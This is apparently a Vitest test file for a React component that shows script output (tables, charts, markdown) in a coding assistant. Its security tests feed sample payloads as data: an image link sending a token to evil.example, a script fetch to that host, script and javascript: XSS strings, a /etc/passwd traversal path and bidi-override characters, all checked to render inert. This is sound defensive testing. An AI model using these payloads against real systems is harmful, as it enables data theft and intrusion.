vi.hoisted(() => vi.resetModules());
import { beforeEach, describe, expect, it, vi } from "vitest";
import {
  fireEvent,
  render,
  screen,
  waitFor,
  within,
} from "../../../utils/test-utils";
import type { PythonDisplay } from "../../../services/refact/types";
import {
  CELL_PREVIEW_CHARS,
  DISPLAYS_SHOWN,
  ScriptDisplays,
  TABLE_ROWS_STEP,
} from "./ScriptDisplays";
import { chartOption } from "./scriptChartOption";
import { CollapsibleStoreProvider } from "../useStoredOpen";
import type { CollapsibleStore } from "../CollapsibleStore";
import {
  chartData,
  chartLabel,
  compactCount,
  displaySize,
  displayTsv,
  rowsNote,
} from "./scriptDisplays";

const chart = vi.hoisted(() => ({ fail: false, options: [] as unknown[] }));
vi.mock("echarts-for-react/lib/core", () => ({
  default: ({ option }: { option: unknown }) => {
    if (chart.fail) throw new Error("chart library failed");
    chart.options.push(option);
    return <div data-testid="echarts-mock" />;
  },
}));
const copied = vi.hoisted(() => [] as string[]);
vi.mock("../../../hooks/useCopyToClipboard", () => ({
  useCopyToClipboard: () => (text: string) => copied.push(text),
}));
const openedFiles = vi.hoisted(() => [] as string[]);
vi.mock("../../../hooks/useOpenFileInApp", () => ({
  useOpenFileInApp: () => ({
    canOpen: true,
    openFile: ({ path }: { path: string }) => openedFiles.push(path),
  }),
}));

const table: PythonDisplay = {
  index: 1,
  kind: "table",
  title: "Slowest tests",
  columns: ["name", "seconds", "note"],
  rows: [
    ["test_a", 12.5, null],
    ["test_b", 3, "x".repeat(300)],
  ],
  rows_total: 12_000,
  truncated: true,
  path: "/run/displays/1.json",
};
const bar: PythonDisplay = {
  index: 2,
  kind: "bar",
  title: "Failures by module",
  columns: ["module", "failures", "skipped"],
  rows: [
    ["core", 4, 1],
    ["api", "n/a", 2],
    ["ui", 7, null],
  ],
  truncated: false,
  x: "module",
  y: ["failures", "skipped"],
  path: "/run/displays/2.json",
};
const markdown: PythonDisplay = {
  index: 3,
  kind: "markdown",
  text: "## Summary\n\n**3** modules fail.\n\n<script>alert(1)</script>",
  truncated: false,
  path: "/run/displays/3.json",
};

beforeEach(() => {
  chart.fail = false;
  chart.options = [];
  openedFiles.length = 0;
  copied.length = 0;
});

describe("display helpers", () => {
  it("sizes, notes and copies tables", () => {
    expect(displaySize(table)).toBe("12,000 rows × 3 columns");
    expect(rowsNote(table)).toBe("Showing 2 of 12,000 rows");
    expect(rowsNote(bar)).toBeUndefined();
    expect(displayTsv({ ...table, rows: [["a\tb", 1, null]] })).toBe(
      "name\tseconds\tnote\na b\t1\t",
    );
    expect(displaySize(markdown)).toMatch(/^\d+ characters$/);
  });
  it("maps chart series from x and y, skipping rows whose y is not a number", () => {
    const data = chartData(bar);
    expect(data?.categories).toEqual(["core", "api", "ui"]);
    expect(data?.series).toEqual([
      { name: "failures", values: [4, null, 7] },
      { name: "skipped", values: [1, 2, null] },
    ]);
    expect(data && chartLabel(bar, data)).toBe(
      "Bar chart: Failures by module, 3 points, series failures, skipped",
    );
    expect(chartData({ ...bar, kind: "pie" })?.series).toHaveLength(1);
    expect(chartData({ ...bar, y: ["missing"] })).toBeUndefined();
  });
  it("formats token counts compactly", () => {
    expect(compactCount(950)).toBe("950");
    expect(compactCount(41_196)).toBe("41.2k");
    expect(compactCount(1_250_000)).toBe("1.3M");
  });
});

describe("ScriptDisplays", () => {
  it("keeps table view, opened cells, shown rows and show-all across a remount of the card", () => {
    const store: CollapsibleStore = {
      get: () => undefined,
      set: () => undefined,
    };
    const many: PythonDisplay[] = [
      table,
      bar,
      markdown,
      { ...table, index: 4, title: "Fourth" },
      {
        ...table,
        index: 5,
        title: "Long",
        rows: Array.from({ length: TABLE_ROWS_STEP + 10 }, (_, i) => [
          `r${i}`,
          i,
          "y".repeat(CELL_PREVIEW_CHARS + 20),
        ]),
      },
    ];
    const card = (runKey: string) => (
      <CollapsibleStoreProvider value={store}>
        <ScriptDisplays displays={many} baseDir="/run" runKey={runKey} />
      </CollapsibleStoreProvider>
    );
    const first = render(card("call-1"));
    fireEvent.click(screen.getByRole("button", { name: "Show as table" }));
    fireEvent.click(
      screen.getByRole("button", { name: /^Show 2 more displays$/ }),
    );
    fireEvent.click(screen.getByRole("button", { name: /^Show 10 more rows/ }));
    const longRegion = screen.getByRole("region", { name: "Long table" });
    fireEvent.click(within(longRegion).getAllByRole("button")[0]);
    first.unmount();

    render(card("call-1"));
    expect(
      screen.getByRole("button", { name: "Show as table" }),
    ).toHaveAttribute("aria-pressed", "true");
    expect(screen.queryByRole("img")).toBeNull();
    expect(
      screen.getByRole("region", { name: "Fourth table" }),
    ).toBeInTheDocument();
    const remounted = screen.getByRole("region", { name: "Long table" });
    expect(within(remounted).getAllByRole("row")).toHaveLength(
      TABLE_ROWS_STEP + 11,
    );
    expect(within(remounted).getAllByRole("button")[0]).toHaveAttribute(
      "aria-expanded",
      "true",
    );
    expect(screen.queryByRole("button", { name: /more rows/ })).toBeNull();
  });
  it("keeps choices apart per run", () => {
    const store: CollapsibleStore = {
      get: () => undefined,
      set: () => undefined,
    };
    const card = (runKey: string) => (
      <CollapsibleStoreProvider value={store}>
        <ScriptDisplays displays={[bar]} baseDir="/run" runKey={runKey} />
      </CollapsibleStoreProvider>
    );
    const first = render(card("call-1"));
    fireEvent.click(screen.getByRole("button", { name: "Show as table" }));
    first.unmount();
    render(card("call-2"));
    expect(
      screen.getByRole("button", { name: "Show as table" }),
    ).toHaveAttribute("aria-pressed", "false");
  });
  it("renders a table with a sticky header, numeric columns, null dashes and long cells", async () => {
    const view = render(<ScriptDisplays displays={[table]} baseDir="/run" />);
    const display = screen.getByRole("region", { name: "Slowest tests" });
    expect(within(display).getByText("12,000 rows × 3 columns")).toBeVisible();
    const scroller = screen.getByRole("region", {
      name: "Slowest tests table",
    });
    expect(scroller).toHaveAttribute("tabindex", "0");
    expect(
      within(scroller).getByRole("columnheader", { name: "seconds" }).className,
    ).toMatch(/numeric/);
    expect(within(scroller).getByText("12.5").className).toMatch(/numeric/);
    expect(within(scroller).getByText("test_a").className).not.toMatch(
      /numeric/,
    );
    expect(within(scroller).getByText("—")).toBeInTheDocument();
    const long = within(scroller).getByRole("button", { expanded: false });
    expect(long.textContent).toHaveLength(CELL_PREVIEW_CHARS);
    fireEvent.click(long);
    const opened = within(scroller).getByRole("button", { expanded: true });
    expect(opened.textContent).toBe("x".repeat(300));
    expect(screen.getByText("Showing 2 of 12,000 rows")).toBeInTheDocument();
    await view.user.click(
      screen.getByRole("button", { name: "Copy Slowest tests" }),
    );
    expect(copied).toEqual([
      `name\tseconds\tnote\ntest_a\t12.5\t\ntest_b\t3\t${"x".repeat(300)}`,
    ]);
    await view.user.click(
      screen.getByRole("button", { name: "Open full data of Slowest tests" }),
    );
    expect(openedFiles).toEqual(["/run/displays/1.json"]);
  });
  it("mounts at most 50 rows of a 200 x 30 table and adds more in steps", () => {
    const wide: PythonDisplay = {
      index: 1,
      kind: "table",
      title: "Wide",
      columns: Array.from({ length: 30 }, (_, index) => `c${index}`),
      rows: Array.from({ length: 200 }, (_, row) =>
        Array.from({ length: 30 }, (_, column) => row * 30 + column),
      ),
      truncated: false,
      path: "/run/displays/1.json",
    };
    const { container } = render(
      <ScriptDisplays displays={[wide]} baseDir="/run" />,
    );
    expect(container.querySelectorAll("tbody tr")).toHaveLength(
      TABLE_ROWS_STEP,
    );
    expect(container.querySelectorAll("tbody td")).toHaveLength(
      TABLE_ROWS_STEP * 30,
    );
    fireEvent.click(
      screen.getByRole("button", { name: "Show 50 more rows of 150" }),
    );
    expect(container.querySelectorAll("tbody tr")).toHaveLength(100);
  });
  it("names header cells for rows wider than the columns", () => {
    render(
      <ScriptDisplays
        displays={[{ ...table, columns: ["only"], rows: [["a", "b"]] }]}
        baseDir="/run"
      />,
    );
    expect(
      screen.getByRole("columnheader", { name: "Column 2" }),
    ).toBeInTheDocument();
  });
  it("shows invisible format characters in titles and cells as markers", () => {
    render(
      <ScriptDisplays
        displays={[
          {
            ...table,
            title: "Totals\u202Eevil",
            rows: [["a\u200Bb", 1, null]],
          },
        ]}
        baseDir="/run"
      />,
    );
    expect(screen.getByText("Totals⟨U+202E⟩evil")).toBeInTheDocument();
    expect(screen.getByText("a⟨U+200B⟩b")).toBeInTheDocument();
  });
  it("disables Open full data for a file outside the run folder", () => {
    render(
      <ScriptDisplays
        displays={[{ ...table, path: "/run/../etc/passwd" }]}
        baseDir="/run"
      />,
    );
    expect(
      screen.getByRole("button", { name: "Open full data of Slowest tests" }),
    ).toBeDisabled();
  });
  it("loads a chart lazily as a named image with a legend for several series, and swaps to a table", async () => {
    render(<ScriptDisplays displays={[bar]} baseDir="/run" />);
    const image = screen.getByRole("img", {
      name: /^Bar chart: Failures by module, 3 points/,
    });
    await waitFor(() =>
      expect(within(image).getByTestId("echarts-mock")).toBeInTheDocument(),
    );
    const option = chart.options.at(-1) as {
      legend?: unknown;
      series: { type: string; data: unknown[] }[];
    };
    expect(option.legend).toBeDefined();
    expect(option.series.map((item) => item.type)).toEqual(["bar", "bar"]);
    const toggle = screen.getByRole("button", { name: "Show as table" });
    expect(toggle).toHaveAttribute("aria-pressed", "false");
    fireEvent.click(toggle);
    expect(toggle).toHaveAttribute("aria-pressed", "true");
    expect(screen.queryByRole("img")).toBeNull();
    expect(
      screen.getByRole("region", { name: "Failures by module data" }),
    ).toBeInTheDocument();
  });
  it("hides the legend for one series", async () => {
    render(
      <ScriptDisplays
        displays={[{ ...bar, kind: "line", y: ["failures"] }]}
        baseDir="/run"
      />,
    );
    await screen.findByTestId("echarts-mock");
    const option = chart.options.at(-1) as { legend?: unknown };
    expect(option.legend).toBeUndefined();
  });
  it("falls back to the table when the chart fails and can try again", async () => {
    chart.fail = true;
    const error = vi
      .spyOn(console, "error")
      .mockImplementation(() => undefined);
    render(<ScriptDisplays displays={[bar]} baseDir="/run" />);
    expect(
      await screen.findByRole("region", { name: "Failures by module data" }),
    ).toBeInTheDocument();
    expect(screen.queryByRole("img")).toBeNull();
    chart.fail = false;
    fireEvent.click(screen.getByRole("button", { name: /Try again/ }));
    expect(await screen.findByTestId("echarts-mock")).toBeInTheDocument();
    error.mockRestore();
  });
  describe("script markdown is inert", () => {
    const md = (text: string): PythonDisplay => ({
      index: 1,
      kind: "markdown",
      text,
      truncated: false,
      path: "/run/displays/1.json",
    });
    it("shows images as alt text and URL, never loading them", () => {
      const { container } = render(
        <ScriptDisplays
          displays={[md("![secret](https://evil.example/x.png?d=token)")]}
          baseDir="/run"
        />,
      );
      expect(container.querySelector("img")).toBeNull();
      expect(
        screen.getByText("secret (https://evil.example/x.png?d=token)"),
      ).toBeInTheDocument();
    });
    it("shows html, svg and mermaid fences as plain code, never an iframe", () => {
      const { container } = render(
        <ScriptDisplays
          displays={[
            md(
              "```html\n<script>fetch('https://evil.example')</script>\n```\n\n```svg\n<svg></svg>\n```\n\n```mermaid\ngraph TD; A-->B\n```",
            ),
          ]}
          baseDir="/run"
        />,
      );
      expect(container.querySelector("iframe")).toBeNull();
      expect(container.querySelector("svg[data-diagram], .mermaid")).toBeNull();
      expect(container.textContent).toContain(
        "<script>fetch('https://evil.example')</script>",
      );
      expect(container.textContent).toContain("graph TD; A-->B");
    });
    it("keeps a puzzle link as plain text", () => {
      const { container } = render(
        <ScriptDisplays
          displays={[md("🧩SETTINGS:editor:/etc/passwd")]}
          baseDir="/run"
        />,
      );
      expect(container.querySelector("button[data-link], a")).toBeNull();
      expect(
        within(container).queryByRole("button", { name: /SETTINGS|passwd/ }),
      ).toBeNull();
      expect(container.textContent).toContain("🧩SETTINGS:editor:/etc/passwd");
    });
    it("keeps external links through the scheme filter and drops in-app links", () => {
      const { container } = render(
        <ScriptDisplays
          displays={[
            md(
              "[docs](https://example.com) [chat](refact://chat/abc) [js](javascript:alert(1))",
            ),
          ]}
          baseDir="/run"
        />,
      );
      const links = [...container.querySelectorAll("a")];
      expect(links.map((link) => link.getAttribute("href"))).toEqual([
        "https://example.com",
      ]);
      expect(container.textContent).toContain("chat");
      expect(container.textContent).toContain("js");
    });
  });
  it("shows an unknown kind as one line with Open full data", () => {
    render(
      <ScriptDisplays
        displays={[
          {
            index: 1,
            kind: "heatmap",
            title: "Grid",
            truncated: false,
            path: "/run/d.json",
          },
        ]}
        baseDir="/run"
      />,
    );
    const display = screen.getByRole("region", { name: "Grid" });
    expect(within(display).getAllByRole("button")).toHaveLength(1);
    expect(
      within(display).getByRole("button", { name: "Open full data of Grid" }),
    ).toBeEnabled();
  });
  it("shows the first three displays and one Show N more control", () => {
    const many = [1, 2, 3, 4, 5].map((index) => ({
      ...table,
      index,
      title: `Table ${index}`,
    }));
    render(<ScriptDisplays displays={many} total={7} baseDir="/run" />);
    expect(screen.getAllByTestId("script-display")).toHaveLength(
      DISPLAYS_SHOWN,
    );
    expect(screen.getByText("Showing 5 of 7 displays")).toBeInTheDocument();
    fireEvent.click(
      screen.getByRole("button", { name: "Show 2 more displays" }),
    );
    expect(screen.getAllByTestId("script-display")).toHaveLength(5);
    expect(document.body.textContent).not.toMatch(/python/i);
  });
  it("says how many displays are not shown when none could be read", () => {
    render(<ScriptDisplays displays={[]} total={3} baseDir="/run" />);
    expect(screen.getByText("3 displays not shown")).toBeInTheDocument();
  });
});

describe("chart options", () => {
  const theme = {
    fg: "#fff",
    muted: "#999",
    faint: "#666",
    grid: "#222",
    axis: "#444",
    accent: "#11f",
    success: "#1f1",
    warning: "#ff1",
    danger: "#f11",
    info: "#1ff",
    palette: ["#a00", "#0a0"],
    tooltip: { bg: "#000", border: "#333", text: "#fff" },
  };
  it("builds a bar chart with categories, a gap for a non-number and no custom formatter", () => {
    const data = chartData(bar);
    if (!data) throw new Error("no chart data");
    const option = chartOption(data, theme, false) as {
      animation: boolean;
      color: string[];
      xAxis: { type: string; data: string[] };
      yAxis: { type: string };
      tooltip: { trigger: string; formatter?: unknown };
      series: { name: string; type: string; data: unknown[] }[];
    };
    expect(option.animation).toBe(false);
    expect(option.color).toEqual(theme.palette);
    expect(option.xAxis).toMatchObject({
      type: "category",
      data: ["core", "api", "ui"],
    });
    expect(option.yAxis.type).toBe("value");
    expect(option.tooltip.trigger).toBe("axis");
    expect(option.tooltip.formatter).toBeUndefined();
    expect(option.series).toEqual([
      expect.objectContaining({
        name: "failures",
        type: "bar",
        data: [4, null, 7],
      }),
      expect.objectContaining({
        name: "skipped",
        type: "bar",
        data: [1, 2, null],
      }),
    ]);
  });
  it("builds a pie from the first series, leaving out missing and negative values", () => {
    const data = chartData({
      ...bar,
      kind: "pie",
      rows: [
        ["core", 4, 1],
        ["api", "n/a", 2],
        ["ui", -2, 0],
        ["db", 6, 0],
      ],
    });
    if (!data) throw new Error("no chart data");
    const option = chartOption(data, theme, true) as {
      legend?: unknown;
      tooltip: { trigger: string; formatter?: unknown };
      series: { type: string; name: string; data: unknown[] }[];
    };
    expect(option.legend).toBeUndefined();
    expect(option.tooltip).toMatchObject({ trigger: "item" });
    expect(option.tooltip.formatter).toBeUndefined();
    expect(option.series).toHaveLength(1);
    expect(option.series[0]).toMatchObject({
      type: "pie",
      name: "failures",
      data: [
        { name: "core", value: 4 },
        { name: "db", value: 6 },
      ],
    });
  });
});
